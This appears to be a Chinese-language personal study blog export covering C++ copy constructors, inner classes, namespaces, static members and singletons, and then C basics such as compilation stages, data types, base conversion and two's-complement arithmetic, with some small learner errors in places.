<h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">	<span class="type">int</span> m_nLength;</span><br><span class="line">	<span class="type">char</span>* m_strBuffer;</span><br><span class="line">public:</span><br><span class="line">	Object() &#123;&#125;</span><br><span class="line">	Object(<span class="type">const</span> <span class="type">char</span>* str)</span><br><span class="line">	&#123;</span><br><span class="line">		m_nLength = <span class="built_in">strlen</span>(str) + <span class="number">1</span>;</span><br><span class="line">		m_strBuffer = new <span class="type">char</span>[m_nLength];</span><br><span class="line">		<span class="built_in">memset</span>(m_strBuffer, <span class="number">0</span>, m_nLength);</span><br><span class="line">		<span class="built_in">strcpy</span>(m_strBuffer, str);</span><br><span class="line">	&#125; </span><br><span class="line">	~Object()</span><br><span class="line">	&#123;</span><br><span class="line">		delete[] m_strBuffer;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	Object <span class="title function_">Obj</span><span class="params">(<span class="string">&quot;Hello World&quot;</span>)</span>;</span><br><span class="line">	Object <span class="title function_">newObj</span><span class="params">(Obj)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>像这样拷贝一个对象，在类中传递了一个指针，当拷贝这个指针时，不会拷贝指针指向地址中存储的数据，而是会拷贝这个指针。</p>
<p>所以当原对象空间被释放时，会把后来拷贝的对象的空间一块释放掉，导致程序错误</p>
<p>这个程序拷贝完之后，发现拷贝后类中的字符串指向的地址是相同的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newObj	&#123;m_nLength=12 m_strBuffer=0x00c8a640 &quot;Hello World&quot; &#125;	Object</span><br><span class="line"></span><br><span class="line">Obj	&#123;m_nLength=12 m_strBuffer=0x00c8a640 &quot;Hello World&quot; &#125;	Object</span><br></pre></td></tr></table></figure>

<p>这两个字符串指向的是同一个地址<code>0x00c8a640</code>，当第一个对象地址释放时，拷贝的对象中的字符串也会被释放。</p>
<h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><p>基于上面这种情况，要自己写一个拷贝构造函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">	<span class="type">int</span> m_nLength;</span><br><span class="line">	<span class="type">char</span>* m_strBuffer;</span><br><span class="line">public:</span><br><span class="line">	Object() &#123;&#125;</span><br><span class="line">	Object(<span class="type">const</span> <span class="type">char</span>* str)</span><br><span class="line">	&#123;</span><br><span class="line">		m_nLength = <span class="built_in">strlen</span>(str) + <span class="number">1</span>;</span><br><span class="line">		m_strBuffer = new <span class="type">char</span>[m_nLength];</span><br><span class="line">		<span class="built_in">memset</span>(m_strBuffer, <span class="number">0</span>, m_nLength);</span><br><span class="line">		<span class="built_in">strcpy</span>(m_strBuffer, str);</span><br><span class="line">	&#125;</span><br><span class="line">	Object(<span class="type">const</span> Object&amp; obj)		<span class="comment">//这里是拷贝构造函数，传入的参数必须是和类相同的对象类型。参数必须是Object&amp;</span></span><br><span class="line">	&#123;</span><br><span class="line">		m_nLength = obj.m_nLength;</span><br><span class="line">		m_strBuffer = new <span class="type">char</span>[m_nLength];	<span class="comment">//开辟了一块新的空间存储拷贝的值</span></span><br><span class="line">		<span class="built_in">memset</span>(m_strBuffer, <span class="number">0</span>, m_nLength);</span><br><span class="line">		<span class="built_in">strcpy</span>(m_strBuffer, obj.m_strBuffer);</span><br><span class="line">	&#125;</span><br><span class="line">	~Object()</span><br><span class="line">	&#123;</span><br><span class="line">		delete[] m_strBuffer;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	Object <span class="title function_">Obj</span><span class="params">(<span class="string">&quot;Hello World&quot;</span>)</span>;</span><br><span class="line">	Object <span class="title function_">newObj</span><span class="params">(Obj)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候再看拷贝后的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Obj	&#123;m_nLength=12 m_strBuffer=0x013ca640 &quot;Hello World&quot; &#125;	Object</span><br><span class="line">newObj	&#123;m_nLength=12 m_strBuffer=0x013ca678 &quot;Hello World&quot; &#125;	Object</span><br></pre></td></tr></table></figure>

<p>一个是<code>0x013ca640</code>，一个是<code>0x013ca678</code>，这样当第一个释放空间的时候，第二个拷贝的对象不受影响。</p>
<h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">InnerClassPrivate</span></span></span><br><span class="line"><span class="class">	&#123;</span></span><br><span class="line">	private:</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		<span class="type">int</span> y;</span><br><span class="line">	public:</span><br><span class="line">		InnerClassPrivate()&#123;&#125;</span><br><span class="line">		InnerClassPrivate(<span class="type">int</span> x, <span class="type">int</span> y)</span><br><span class="line">		&#123;</span><br><span class="line">			this-&gt;x = x;</span><br><span class="line">			this-&gt;y = y;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	OutClass() &#123;&#125;</span><br><span class="line">	OutClass(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">	&#123;</span><br><span class="line">		this-&gt;a = a;</span><br><span class="line">		this-&gt;b = b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">void</span> <span class="title function_">Fn</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		InnerClassPrivate <span class="title function_">In</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	OutClass <span class="title function_">Out</span><span class="params">(<span class="number">5</span>, <span class="number">6</span>)</span>;</span><br><span class="line">	OutClass::InnerClassPrivate(<span class="number">7</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内部类就是定义在一个类内部的类，可以将内部类定义在外部类的public中，从外部使用<code>OutClass::InnerCLass();</code>可以进行访问。</p>
<p>如果内部类只在这个外部类中使用，则可以定义在这个类的private中，让外部无法访问或者也可以提供使用函数。内部类也可以定义在函数中，比如定义在OutClass的Fn()中。</p>
<p>内部类不会占用外部类的空间。外部类有<code>int a; int b;</code>，其中内部类中有<code>int x</code>，则外部类的大小仍然是8字节。</p>
<h2 id="namespace命名空间"><a href="#namespace命名空间" class="headerlink" title="namespace命名空间"></a>namespace命名空间</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">namespace ns1 &#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">Fn</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> x + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">NameSpace</span></span></span><br><span class="line"><span class="class">	&#123;</span></span><br><span class="line">	private:</span><br><span class="line">		<span class="type">int</span> i;</span><br><span class="line">		<span class="type">int</span> j;</span><br><span class="line">		NameSpace() &#123;&#125;</span><br><span class="line">		NameSpace(<span class="type">int</span> i, <span class="type">int</span> j)</span><br><span class="line">		&#123;</span><br><span class="line">			this-&gt;i = i;</span><br><span class="line">			this-&gt;j = j;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace ns2 &#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">Fn</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> x + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">NameSpace</span></span></span><br><span class="line"><span class="class">	&#123;</span></span><br><span class="line">	private:</span><br><span class="line">		<span class="type">int</span> i;</span><br><span class="line">		<span class="type">int</span> j;</span><br><span class="line">		NameSpace() &#123;&#125;</span><br><span class="line">		NameSpace(<span class="type">int</span> i, <span class="type">int</span> j)</span><br><span class="line">		&#123;</span><br><span class="line">			this-&gt;i = i;</span><br><span class="line">			this-&gt;j = j;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	ns1::a = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ns2::Fn(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>命名空间中的变量、函数、类等的名称可以相同，当调用时，用<code>namespace::成员名</code>来使用。</p>
<p>如果是创建了一个类文件，在头文件中声明后，可以用using namespace 命名空间来让整个程序直接使用指定命名空间中的成员。</p>
<h2 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>static关键字修饰的变量相当于一个私有的全局变量</p>
<p>比如有这样的一个类：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">`<span class="class"><span class="keyword">class</span> <span class="title">staClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">public :</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">	<span class="type">int</span> c;</span><br><span class="line">	staClass() &#123;&#125;</span><br><span class="line">	staClass(<span class="type">int</span> b, <span class="type">int</span> c)</span><br><span class="line">	&#123;</span><br><span class="line">		this-&gt;b = b;</span><br><span class="line">		this-&gt;c = c;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中变量a用static修饰，所以在staClass这个类中，a是一个属于staClass私有的全局变量，可以直接进行访问，但是不能从外部访问。</p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public :</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> z;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">	Demo() &#123;&#125;</span><br><span class="line">	Demo(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">	&#123;</span><br><span class="line">		this-&gt;a = a;</span><br><span class="line">		this-&gt;b = b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">SetZ</span><span class="params">(<span class="type">int</span> z)</span></span><br><span class="line">	&#123;</span><br><span class="line">		this-&gt;z = z;</span><br><span class="line">		<span class="keyword">return</span> z;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">GetZ</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> z;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Demo::z;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	Demo <span class="title function_">d1</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>)</span>;</span><br><span class="line">	Demo <span class="title function_">d2</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> temp = d1.SetZ(<span class="number">5</span>);</span><br><span class="line">	<span class="type">int</span> temp2 = d2.GetZ();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码中，int z用static修饰，所以z属于这个类中的全局变量，当使用d1对象访问和使用d2对象访问时，访问的是同一个z的地址。</p>
<h3 id="static单子模式"><a href="#static单子模式" class="headerlink" title="static单子模式"></a>static单子模式</h3><p>当要限制创建一个对象时，可以使用static函数进行限制。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">	One() &#123;&#125;		<span class="comment">//1.首先要将无参构造函数私有，使从外部不能直接创建对象</span></span><br><span class="line">	<span class="type">static</span> One* SetUpPoint;		<span class="comment">//3.创建一个静态成员，类型是One指针类型</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">static</span> One* <span class="title function_">Setup</span><span class="params">()</span>		<span class="comment">//2.提供一个静态函数，因为static修饰的函数从外部可以被访问</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (SetUpPoint == <span class="literal">NULL</span>)		<span class="comment">//5.当这个指针是空指针时，就创建一个对象</span></span><br><span class="line">			SetUpPoint = new One();</span><br><span class="line">		<span class="keyword">return</span> SetUpPoint;			<span class="comment">//6.将创建的这个指针返回</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">One* One::SetUpPoint = <span class="literal">NULL</span>;		<span class="comment">//4.初始化静态成员为空指针</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	One* p1 = One::Setup();</span><br><span class="line">	One* p2 = One::Setup();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="面向对象设计中的static之静态成员函数："><a href="#面向对象设计中的static之静态成员函数：" class="headerlink" title="面向对象设计中的static之静态成员函数："></a>面向对象设计中的static之静态成员函数：</h3><p><strong>总结：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt;出现在类体外的函数定义不能指定关键字static；</span><br><span class="line">&lt;2&gt;静态成员之间可以相互访问，包括静态成员函数访问静态数据成员和访问静态成员函数；</span><br><span class="line">&lt;3&gt;非静态成员函数可以任意地访问静态成员函数和静态数据成员；</span><br><span class="line">&lt;4&gt;静态成员函数不能访问非静态成员函数和非静态数据成员；</span><br><span class="line">&lt;5&gt;调用类的静态成员函数的两种方式；</span><br><span class="line">		&lt;类名&gt;::&lt;静态成员函数名&gt;（&lt;参数表&gt;）</span><br><span class="line">		&lt;对象名&gt;.&lt;静态成员函数名&gt;(&lt;参数表&gt;)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>Cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>c</title>
    <url>/2023/12/15/c/</url>
    <content><![CDATA[<h1 id="C"><a href="#C" class="headerlink" title="C"></a>C</h1><h2 id="C基础"><a href="#C基础" class="headerlink" title="C基础"></a>C基础</h2><h3 id="一、c语言分步编译"><a href="#一、c语言分步编译" class="headerlink" title="一、c语言分步编译"></a>一、c语言分步编译</h3><p>1.预处理：宏定义展开 头文件展开 条件编译 去注释</p>
<p>2.汇编 检查语法 将C语言转变成汇编语言</p>
<p>3.汇编 将汇编语言转成机器语言</p>
<p>4.链接 将C语言依赖库链接到程序中</p>
<p><img src="/2023/12/15/c/image-20231204140915723.png" alt="image-20231204140915723"></p>
<span id="more"></span>

<img src="/2023/12/15/c/image-20231204141249224.png" alt="image-20231204141249224" style="zoom: 67%;">

<h4 id="一步编译"><a href="#一步编译" class="headerlink" title="一步编译"></a>一步编译</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">gcc -o hello.exe hello1.c hello2.c</span><br></pre></td></tr></table></figure>

<h4 id="常见代码异常"><a href="#常见代码异常" class="headerlink" title="常见代码异常"></a>常见代码异常</h4><p>1.编辑时异常</p>
<p>2.编译时异常</p>
<p>3.运行时异常</p>
<h4 id="程序执行过程"><a href="#程序执行过程" class="headerlink" title="程序执行过程"></a>程序执行过程</h4><p><img src="/2023/12/15/c/image-20231204142152340.png" alt="image-20231204142152340"></p>
<h3 id="二、汇编语言和程序调试"><a href="#二、汇编语言和程序调试" class="headerlink" title="二、汇编语言和程序调试"></a>二、汇编语言和程序调试</h3><img src="/2023/12/15/c/image-20231204145742260.png" alt="image-20231204145742260" style="zoom:50%;">

<p><img src="/2023/12/15/c/image-20231204145845807.png" alt="image-20231204145845807"></p>
<blockquote>
<h4 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h4><p>mov 移动<br>add 添加<br>push 压栈<br>pop 出栈<br>call 调用<br>eax 32位寄存器<br>简单的加法计算</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov a, 3</span><br><span class="line">mov b, 4</span><br><span class="line">mov eax, a </span><br><span class="line">add eax, b</span><br><span class="line">mov c, eax</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>快捷键：<br>断点 F9<br>调试 F5<br>逐语句执行 F11<br>逐过程执行 F10</p>
</blockquote>
<h4 id="寄存器名字"><a href="#寄存器名字" class="headerlink" title="寄存器名字"></a>寄存器名字</h4><p><img src="/2023/12/15/c/image-20231204151902735.png" alt="image-20231204151902735"></p>
<h3 id="三、数据类型"><a href="#三、数据类型" class="headerlink" title="三、数据类型"></a>三、数据类型</h3><img src="/2023/12/15/c/image-20231204152719971.png" alt="image-20231204152719971" style="zoom:67%;">

<h4 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h4><p>1.定义常量名</p>
<p>const 数据类型 常量名 &#x3D; 值;（不建议，不安全</p>
<p>#define 常量名 值;</p>
<p>2.整形变量的定义和输出</p>
<table>
<thead>
<tr>
<th>打印格式</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>%d</td>
<td>输出一个有符号的10进制int类型</td>
</tr>
<tr>
<td>%o</td>
<td>输出8进制的int类型</td>
</tr>
<tr>
<td>%x</td>
<td>输出16进制的int类型，字母以小写输出</td>
</tr>
<tr>
<td>%X</td>
<td>输出16进制的int类型，字母以大写输出</td>
</tr>
<tr>
<td>%u</td>
<td>输出一个10进制的无符号数</td>
</tr>
</tbody></table>
<p>3.进制计算</p>
<h4 id="整形输入"><a href="#整形输入" class="headerlink" title="整形输入"></a>整形输入</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>出现报错：</p>
<blockquote>
<p>error C4996: ‘scanf’: This function or variable may be unsafe. Consider using scanf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS</p>
</blockquote>
<p>解决scanf()安全问题</p>
<p>使用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br></pre></td></tr></table></figure>

<h4 id="short、int、long、long-long"><a href="#short、int、long、long-long" class="headerlink" title="short、int、long、long long"></a>short、int、long、long long</h4><table>
<thead>
<tr>
<th>数据类型</th>
<th>占用空间</th>
</tr>
</thead>
<tbody><tr>
<td>short</td>
<td>2字节</td>
</tr>
<tr>
<td>int</td>
<td>4字节</td>
</tr>
<tr>
<td>long</td>
<td>Windows为4字节，Linux为4字节(32位)，8字节(64位)</td>
</tr>
<tr>
<td>long long</td>
<td>8字节</td>
</tr>
</tbody></table>
<p>输出时的占位符：</p>
<img src="/2023/12/15/c/image-20231204202543936.png" alt="image-20231204202543936" style="zoom:67%;">

<p>sizeof计算数据类型大小</p>
<img src="/2023/12/15/c/image-20231204203738931.png" alt="image-20231204203738931" style="zoom:50%;">

<h4 id="字符型：char"><a href="#字符型：char" class="headerlink" title="字符型：char"></a>字符型：char</h4><p>定义：char 数据名 &#x3D; ‘字符’;</p>
<p>sizeof(char)  1字节</p>
<p>对应ASCII码表</p>
<h4 id="float-double"><a href="#float-double" class="headerlink" title="float double"></a>float double</h4><img src="/2023/12/15/c/image-20231204205801024.png" alt="image-20231204205801024" style="zoom:50%;">

<p>float和double认为保留小数点后6位是精确的</p>
<p>打印地址编号</p>
<img src="/2023/12/15/c/image-20231204211118884.png" alt="image-20231204211118884" style="zoom: 50%;">

<p>科学计数法打印float：占位符 %e</p>
<img src="/2023/12/15/c/image-20231204211620965.png" alt="image-20231204211620965" style="zoom:67%;">

<p>将科学计数法转换成正常浮点数</p>
<img src="/2023/12/15/c/image-20231204211903963.png" alt="image-20231204211903963" style="zoom:67%;">

<h3 id="四、进制相互转化"><a href="#四、进制相互转化" class="headerlink" title="四、进制相互转化"></a>四、进制相互转化</h3><p><strong>二进制十进制互转：</strong>转低进制，除二反序取余法，转高进制，权值法</p>
<img src="/2023/12/15/c/image-20231204213533505.png" alt="image-20231204213533505" style="zoom: 50%;">

<p><strong>八进制十进制互转：</strong>除八反序取余法，权值法</p>
<img src="/2023/12/15/c/image-20231204214714937.png" alt="image-20231204214714937" style="zoom:50%;">

<p><strong>十进制十六进制互转</strong>：除十六反序取余法</p>
<img src="/2023/12/15/c/image-20231204214848129.png" alt="image-20231204214848129" style="zoom:50%;">

<h5 id="进制转变简单方法"><a href="#进制转变简单方法" class="headerlink" title="进制转变简单方法"></a>进制转变简单方法</h5><p><strong>二进制十进制互转：8421法则</strong></p>
<p>①	11101	16+8+4+0+1&#x3D;29</p>
<p>②	29		29不包含32，从16开始，29-16&#x3D;13，13包含8，13-8&#x3D;5，5包含4，5-4&#x3D;1</p>
<p>​			  所以1 4 8 16分别对应1 100 1000 10000，将这四个数相加得11101</p>
<p><strong>二进制八进制互转：三位一隔</strong></p>
<p>①	11001000100111110101010		从后向前三位一隔	<br>​					11 001 000 100 111 110 101 010<br>​					 3    1     0     4    7     6     5     2</p>
<p>所以11001000100111110101010   &#x3D;&gt;   31047652</p>
<p>②	31047652		将每一位数转换成三位二进制数</p>
<p>​				 3       1        0        4       7        6        5        2<br>​				11    001    000    100    111    110    101    010</p>
<p>​				所以31047652	&#x3D;&gt;	所以11001000100111110101010</p>
<p><strong>二进制十六进制互转：四位一隔</strong></p>
<p>①     7        3          a         b           c<br>​	0111    0011   1010    1011     1100</p>
<p>②0111    0011   1010    1011     1100</p>
<p>​     7        3          a         b           c</p>
<h3 id="五、计算机内存数值存储方式"><a href="#五、计算机内存数值存储方式" class="headerlink" title="五、计算机内存数值存储方式"></a>五、计算机内存数值存储方式</h3><p><strong>原码：</strong></p>
<p>①最高位作为符号位，0为正，1为负<br>②其他数值部分就是数值本身绝对值的二进制数<br>③负数是在绝对值的基础上将最高位变为1</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>+15</td>
<td>0000 1111</td>
</tr>
<tr>
<td>-15</td>
<td>1000 1111</td>
</tr>
<tr>
<td>+0</td>
<td>0000 0000</td>
</tr>
<tr>
<td>-0</td>
<td>1000 0000</td>
</tr>
</tbody></table>
<p>原码表示法简单易懂，与带符号数本身转换比较方便，只要符号还原即可，但是，当两个正数相减或不同符号数相加时，必须比较两个数哪一个绝对值大，才能决定谁减谁，才能决定结果是正是负，所以原码不便于加减运算。</p>
<p><strong>反码：</strong></p>
<p>①对于正数，反码与原码相同</p>
<p>②对于负数，符号位不变，其他部分取反（1,0）</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>+15</td>
<td>0000 1111</td>
</tr>
<tr>
<td>-15</td>
<td>1111 0000</td>
</tr>
<tr>
<td>+0</td>
<td>0000 0000</td>
</tr>
<tr>
<td>-0</td>
<td>1111 1111</td>
</tr>
</tbody></table>
<p>反码运算起来也不方便，通常用来作为求补码的中间过度。</p>
<p><strong>补码：</strong></p>
<p>①对于正数，原码、反码、补码相同<br>②对于负数，补码为它的反码+1<br>③补码符号位不动，其他位求反，最后整个数+1，得到反码</p>
<p><strong>计算：</strong></p>
<p><strong>①</strong>56 - 45  &#x3D;&gt;  56 + （-45）<br>原码：0011 1000<br>反码：0011 1000<br>补码：0011 1000</p>
<p>原码：1010 1101<br>反码：1101 0010<br>补码：1101 0011</p>
<p> 56补码 0011 1000<br>-45补码 1101 0011</p>
<p>56 - 45 补码：1 0000 1011<br>多一位，将第一位舍弃<br>得0000 1011 补码和原码相同 &#x3D;&gt;  11</p>
<p><strong>②</strong>26 - 68<br>原码：0001 1010<br>反码：0001 1010<br>补码：0001 1010</p>
<p>原码：1100 0100<br>反码：1011 1011<br>补码：1011 1100</p>
<p> 26补码：0001 1010<br>-68补码：1011 1100</p>
<p>26 + （-68）<br>补码：1101 0110<br>反码：1101 0101<br>原码：1010 1010  &#x3D;&gt;  -42</p>
<p><strong>数据区间</strong></p>
<p>8bit：-2^7 ~ 2^7-1		-128~127</p>
<p>32bit：-2^31 ~ 2^31-1	-2,147,483,648~2,147,483,647</p>
<p>64bit：-2^63 ~ 2^63-1	-9,223,372,036,854,775,808~9,223,372,036,854,775,807</p>
<p><strong>无符号	数据存储在计算器中不存在符号位</strong><br>unsigned char 0~255</p>
<p>最大值：1111 1111 2^8-1<br>最小值：0000 0000 0</p>
<p>unsigned int 0~4,294,967,295</p>
<p>最大值：1111 1111 1111 1111 1111 1111 1111 1111				2^32-1&#x3D;4,294,967,295<br>最小值：0000 0000 0000 0000 0000 0000 0000 0000		0</p>
<h4 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h4><p>当超出一个数据类型能够存放的最大范围时，数值会溢出</p>
<p>有符号位 最高位溢出的区别：符号位溢出会导致数的正负发生改变，但最高位溢出会导致最高位丢失</p>
<p>如：<img src="/2023/12/15/c/image-20231205151823426.png" alt="image-20231205151823426" style="zoom:50%;"></p>
<h3 id="类型限定"><a href="#类型限定" class="headerlink" title="类型限定"></a>类型限定</h3><table>
<thead>
<tr>
<th>限定符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>extern</td>
<td>声明一个变量，extern声明的变量没有建立存储空间。extern int a;&#x2F;&#x2F;变量在定义的时候创建存储空间</td>
</tr>
<tr>
<td>const</td>
<td>定义一个常量，常量的值不能修改。<br>const int a &#x3D; 10;</td>
</tr>
<tr>
<td>Volatile</td>
<td>防止编译器优化代码</td>
</tr>
<tr>
<td>register</td>
<td>定义寄存器变量，提高效率。这是建议型指令，而不是命令型指令，如果CPU有空闲寄存器，那么register生效</td>
</tr>
</tbody></table>
